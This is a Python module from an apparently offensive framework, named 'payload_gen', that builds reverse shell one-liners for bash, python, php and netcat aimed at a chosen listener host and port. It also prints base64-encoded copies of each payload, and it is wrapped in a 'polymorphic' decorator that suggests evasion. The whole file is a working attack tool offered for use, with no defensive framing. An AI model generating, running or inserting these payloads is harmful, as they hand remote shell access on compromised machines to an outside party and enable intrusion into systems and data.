from core.base_module import BaseModule
from utils.polymorphic_wrapper import PolymorphicWrapper
import base64
import os

@PolymorphicWrapper.wrap_module
@PolymorphicWrapper.wrap_module
class PayloadGen(BaseModule):
    def __init__(self, framework):
        super().__init__(framework)
        self.name = "payload_gen"
        self.description = "Generate various reverse shell payloads."

    def run(self, args):
        if len(args) < 2:
            print("Usage: use payload_gen <type> <lhost> [lport]")
            print("Types: bash, python, php, nc")
            return
        
        ptype = args[0]
        lhost = args[1]
        lport = args[2] if len(args) > 2 else "4444"
        
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        }
        
        if ptype in payloads:
            print(f"\nGenerated {ptype} payload:")
            print("-" * 40)
            print(payloads[ptype])
            print("-" * 40)
            
            # Also provide base64 encoded version
            encoded = base64.b64encode(payloads[ptype].encode()).decode()
            print(f"\nBase64 encoded:")
            print(encoded)
        else:
            print(f"Unknown payload type: {ptype}")
